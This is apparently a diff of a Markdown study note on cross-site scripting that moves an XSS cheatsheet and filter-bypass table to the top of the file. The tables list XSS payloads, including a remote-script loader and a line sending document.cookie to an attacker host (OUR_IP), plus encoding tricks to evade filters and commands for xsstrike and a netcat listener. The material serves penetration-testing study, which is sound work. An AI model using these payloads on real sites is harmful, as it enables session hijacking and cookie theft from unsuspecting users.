@@ -45,6 +45,44 @@
     - Reporting a post or user
     - etc.
 
+# XSS Cheatsheet
+
+## Commands
+
+| Code | Description |
+| ----- | ----- |
+| **XSS Payloads** |
+| `<script>alert(window.origin)</script>` | Basic XSS Payload |
+| `<plaintext>` | Basic XSS Payload |
+| `<script>print()</script>` | Basic XSS Payload |
+| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
+| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
+| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
+| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
+| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
+| **Commands** |
+| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
+| `sudo nc -lvnp 80` | Start `netcat` listener |
+| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server |
+
+---
+
+## Common Encoding Bypasses
+
+| Filter                | Bypass                                                                          |
+| --------------------- | ------------------------------------------------------------------------------- |
+| `<script>` blocked    | `<ScRiPt>`, `<scr<script>ipt>`, `<svg/onload=alert(1)>`                         |
+| `alert` blocked       | `confirm(1)`, `prompt(1)`, `alert&#40;1&#41;`, `` alert`1` ``                   |
+| `on*` events blocked  | Try less common events: `onfocus`, `oncontentvisuallynoncontiguous`, `ontoggle` |
+| Parentheses blocked   | `` alert`1` ``, `throw/a]SOME/,Uncaught(1)` , `onerror=alert;throw 1`           |
+| Quotes blocked        | `String.fromCharCode(88,83,83)`, `/string/.source`                              |
+| Spaces blocked        | `/**/`, `/`, `%09`, `%0a`, `%0d`                                                |
+| `javascript:` blocked | `java%0ascript:`, `\x6Aavascript:`, `javascript&colon;`                         |
+
+
 ## Content Security Policy
 
 CSP is a secondary protection mechanism that helps protect against XSS, Clickjacking, and other types of attacks.
@@ -307,38 +345,6 @@ Try hosting our own script
 new Image().src = "http://OUR_IP/index.php?c=" + document.cookie;
 ```
 
-## Common Encoding Bypasses
-
-| Filter                | Bypass                                                                          |
-| --------------------- | ------------------------------------------------------------------------------- |
-| `<script>` blocked    | `<ScRiPt>`, `<scr<script>ipt>`, `<svg/onload=alert(1)>`                         |
-| `alert` blocked       | `confirm(1)`, `prompt(1)`, `alert&#40;1&#41;`, `` alert`1` ``                   |
-| `on*` events blocked  | Try less common events: `onfocus`, `oncontentvisuallynoncontiguous`, `ontoggle` |
-| Parentheses blocked   | `` alert`1` ``, `throw/a]SOME/,Uncaught(1)` , `onerror=alert;throw 1`           |
-| Quotes blocked        | `String.fromCharCode(88,83,83)`, `/string/.source`                              |
-| Spaces blocked        | `/**/`, `/`, `%09`, `%0a`, `%0d`                                                |
-| `javascript:` blocked | `java%0ascript:`, `\x6Aavascript:`, `javascript&colon;`                         |
-
-## Commands
-
-| Code                                                                                          | Description                       |
-| --------------------------------------------------------------------------------------------- | --------------------------------- |
-| **XSS Payloads**                                                                              |                                   |
-| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
-| `<plaintext>`                                                                                 | Basic XSS Payload                 |
-| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
-| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
-| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
-| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
-| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
-| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
-| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
-| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
-| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
-| **Commands**                                                                                  |                                   |
-| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
-| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
-| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
 
 ---
 
